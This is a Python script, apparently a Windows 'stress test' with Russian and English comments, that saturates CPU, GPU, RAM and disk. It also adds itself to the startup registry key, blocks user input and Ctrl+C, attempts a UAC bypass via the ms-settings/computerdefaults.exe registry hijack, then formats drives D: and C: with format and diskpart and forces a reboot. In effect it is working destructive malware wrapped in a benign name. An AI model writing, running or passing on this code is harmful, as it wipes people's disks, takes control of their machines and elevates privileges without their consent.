import multiprocessing  # для работы с процессами / for working with processes
import threading  # для работы с потоками / for working with threads
import numpy as np  # для математических операций / for mathematical operations
import os  # для работы с файловой системой / for filesystem operations
import math  # математические функции / math functions
import random  # генерация случайных чисел / random number generation
import sys  # системные функции / system functions
import ctypes  # для вызова Windows API / for calling Windows API
import winreg as reg  # для работы с реестром Windows / for Windows registry operations
import time  # для работы со временем / for time operations
import platform  # для определения ОС / for OS detection
from multiprocessing import Pool, cpu_count  # для параллельных вычислений / for parallel computations
import subprocess  # для запуска процессов / for running processes

# Константа Windows API для управления блокировкой переднего плана
# Windows API constant for foreground lock timeout management
SPI_SETFOREGROUNDLOCKTIMEOUT = 0x2001


def add_to_startup():
    """
    Добавляет скрипт в автозагрузку Windows.
    Adds the script to Windows startup.
    """
    try:
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS) as registry_key:
            reg.SetValueEx(registry_key, "ExtremeStressTest", 0, reg.REG_SZ,
                           sys.executable + ' "' + os.path.abspath(__file__) + '"')
    except:
        pass  # игнорируем ошибки / ignore errors


def prevent_closing():
    """
    Пытается предотвратить закрытие скрипта:
    - блокирует ввод
    - изменяет параметры Windows
    - отключает обработчик Ctrl+C
    Tries to prevent script closing:
    - blocks input
    - changes Windows parameters
    - disables Ctrl+C handler
    """
    try:
        ctypes.windll.user32.BlockInput(True)
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, 0, 0)
        kernel32 = ctypes.WinDLL('kernel32')
        kernel32.SetConsoleCtrlHandler(None, 1)
    except:
        pass  # игнорируем ошибки / ignore errors


def cpu_stress_worker(difficulty):
    """
    Создает экстремальную нагрузку на CPU.
    Creates extreme CPU load.

    Args:
        difficulty (int): Уровень сложности (интенсивность вычислений)
                         Difficulty level (computation intensity)
    """
    while True:
        # Комплексные математические вычисления / Complex math computations
        x = math.sin(math.cos(math.tan(math.log(abs(math.sqrt(random.random() * 1000000))))))
        y = sum(i * i for i in range(10000))
        z = int(x * y) ^ int(x * y) | int(x * y) & int(x * y)
        s = str(z) * 100
        h = hash(s)
        c = complex(x, y) ** complex(y, x)
        arr = [random.random() for _ in range(100000)]
        arr.sort()
        arr.reverse()
        _ = sum(arr)


def gpu_extreme_stress(difficulty):
    """
    Создает экстремальную нагрузку на GPU с использованием CuPy (если доступен) или NumPy.
    Creates extreme GPU load using CuPy (if available) or NumPy.

    Args:
        difficulty (int): Уровень сложности (размер матриц и количество операций)
                         Difficulty level (matrix size and operation count)
    """
    try:
        import cupy as cp
        use_cupy = True
    except ImportError:
        use_cupy = False

    matrix_size = 2048 * difficulty
    tensor_size = 512 * difficulty

    while True:
        if use_cupy:
            # Интенсивные операции на GPU с CuPy / Intensive GPU operations with CuPy
            a = cp.random.rand(matrix_size, matrix_size)
            b = cp.random.rand(matrix_size, matrix_size)
            for _ in range(50 * difficulty):
                c = cp.dot(a, b)
                c = cp.fft.fft2(c)
                c = cp.linalg.svd(c)
                t = cp.random.rand(tensor_size, tensor_size, tensor_size)
                t = cp.einsum('ijk,jkl->ijl', t, t)
        else:
            # Операции на CPU с NumPy (если CuPy недоступен) / CPU operations with NumPy (if CuPy not available)
            a = np.random.rand(matrix_size, matrix_size)
            b = np.random.rand(matrix_size, matrix_size)
            for _ in range(10 * difficulty):
                c = np.dot(a, b)
                c = np.fft.fft2(c)
                c = np.linalg.svd(c)

        if use_cupy:
            # Дополнительные 3D-операции / Additional 3D operations
            vertices = cp.random.rand(500000 * difficulty, 3)
            transform = cp.random.rand(3, 3)
            for _ in range(20 * difficulty):
                vertices = cp.dot(vertices, transform)
                normals = cp.cross(vertices, cp.roll(vertices, 1, axis=0))
                light_dir = cp.random.rand(3)
                intensity = cp.dot(normals, light_dir)


def ram_extreme_stress():
    """
    Создает экстремальную нагрузку на оперативную память.
    Creates extreme RAM load.
    """
    chunk_size = 200 * 1024 * 1024  # 200MB chunks / блоки по 200 МБ
    data = []

    while True:
        try:
            if random.random() > 0.5:
                chunk = bytearray(os.urandom(chunk_size))  # случайные байты / random bytes
            else:
                chunk = np.random.rand(chunk_size // 8)  # случайные числа / random numbers

            data.append(chunk)

            if len(data) > 10:
                data_copy = data.copy()  # дополнительное копирование / additional copying
                del data_copy

        except MemoryError:
            data.clear()  # очистка при нехватке памяти / clear on memory error
            time.sleep(0.1)


def storage_stress():
    """
    Создает экстремальную нагрузку на хранилище (чтение/запись).
    Creates extreme storage load (read/write).
    """
    temp_file = "stress_test_temp.bin"
    chunk_size = 1024 * 1024 * 1024  # 1GB chunks / блоки по 1 ГБ
    data = os.urandom(chunk_size)  # случайные данные / random data

    while True:
        try:
            # Интенсивная запись / Intensive writing
            with open(temp_file, "wb") as f:
                for _ in range(20):
                    f.write(data)

            def read_chunk():
                # Интенсивное чтение / Intensive reading
                with open(temp_file, "rb") as f:
                    while f.read(chunk_size):
                        pass

            # Многопоточное чтение / Multithreaded reading
            threads = [threading.Thread(target=read_chunk) for _ in range(4)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            os.remove(temp_file)  # удаление временного файла / delete temp file
        except:
            if os.path.exists(temp_file):
                os.remove(temp_file)
            time.sleep(1)


def start_cpu_stress(difficulty):
    """
    Запускает процессы для нагрузки CPU на всех ядрах.
    Starts CPU stress processes on all cores.

    Args:
        difficulty (int): Уровень сложности / Difficulty level

    Returns:
        list: Список запущенных процессов / List of started processes
    """
    processes = []
    for _ in range(cpu_count()):
        p = multiprocessing.Process(target=cpu_stress_worker, args=(difficulty,))
        p.start()
        processes.append(p)
    return processes


def bypass_uac():
    """
    Пытается обойти UAC (User Account Control) для получения прав администратора.
    Attempts to bypass UAC (User Account Control) to gain admin privileges.

    Returns:
        bool: Успех операции / Operation success
    """
    try:
        # Изменение реестра для обхода UAC / Registry modification for UAC bypass
        key = reg.OpenKey(
            reg.HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\shell\\open\\command",
            0, reg.KEY_ALL_ACCESS
        )
        reg.SetValueEx(key, "", 0, reg.REG_SZ, sys.executable)
        reg.SetValueEx(key, "DelegateExecute", 0, reg.REG_SZ, "")
        reg.CloseKey(key)

        # Запуск процесса для срабатывания UAC bypass / Process launch to trigger UAC bypass
        subprocess.run("computerdefaults.exe", shell=True)
        time.sleep(3)

        try:
            # Очистка изменений реестра / Cleanup registry changes
            reg.DeleteKey(
                reg.HKEY_CURRENT_USER,
                "Software\\Classes\\ms-settings\\shell\\open\\command"
            )
        except:
            pass

        return True
    except:
        return False


def format_disk(drive_letter):
    """
    Форматирует указанный диск (деструктивная операция).
    Formats specified disk (destructive operation).

    Args:
        drive_letter (str): Буква диска (например, 'C:')
                           Drive letter (e.g. 'C:')
    """
    try:
        # Попытка форматирования через format / Attempt formatting via format
        subprocess.run(f'format {drive_letter} /FS:NTFS /Q /Y',
                       shell=True,
                       check=True,
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
    except:
        try:
            # Альтернативный метод через diskpart / Alternative method via diskpart
            script = f"""select volume {drive_letter.rstrip(':')}
clean
create partition primary
format fs=NTFS quick
assign letter={drive_letter.rstrip(':')}"""
            with open('format_script.txt', 'w') as f:
                f.write(script)
            subprocess.run('diskpart /s format_script.txt',
                           shell=True,
                           check=True,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
            os.remove('format_script.txt')
        except:
            pass


def destructive_operations():
    """
    Выполняет деструктивные операции (требует прав администратора):
    - обход UAC
    - форматирование дисков
    - перезагрузка системы
    Performs destructive operations (requires admin privileges):
    - UAC bypass
    - disk formatting
    - system reboot
    """
    if not ctypes.windll.shell32.IsUserAnAdmin():
        if bypass_uac():
            sys.exit(0)

    format_disk('D:')  # форматирование диска D: / format D: drive
    format_disk('C:')  # форматирование диска C: / format C: drive
    os.system('shutdown /r /t 0')  # немедленная перезагрузка / immediate reboot


def main():
    """
    Основная функция, запускающая все стресс-тесты и деструктивные операции.
    Main function that starts all stress tests and destructive operations.
    """
    if platform.system() == "Windows":
        add_to_startup()  # добавление в автозагрузку / add to startup
        prevent_closing()  # предотвращение закрытия / prevent closing

    difficulty = 20  # уровень сложности / difficulty level
    cpu_processes = start_cpu_stress(difficulty)  # нагрузка CPU / CPU stress

    # Компоненты для нагрузки / Stress components
    components = [
        (gpu_extreme_stress, difficulty),  # нагрузка GPU / GPU stress
        (ram_extreme_stress,),  # нагрузка RAM / RAM stress
        (storage_stress,)  # нагрузка хранилища / storage stress
    ]

    # Запуск в отдельных потоках / Run in separate threads
    threads = []
    for func, *args in components:
        t = threading.Thread(target=func, args=args, daemon=True)
        t.start()
        threads.append(t)

    time.sleep(15)  # задержка перед деструктивными операциями / delay before destructive ops
    destructive_thread = threading.Thread(target=destructive_operations)
    destructive_thread.start()

    while True:
        pass  # бесконечный цикл / infinite loop


if __name__ == "__main__":
    main()  # точка входа / entry point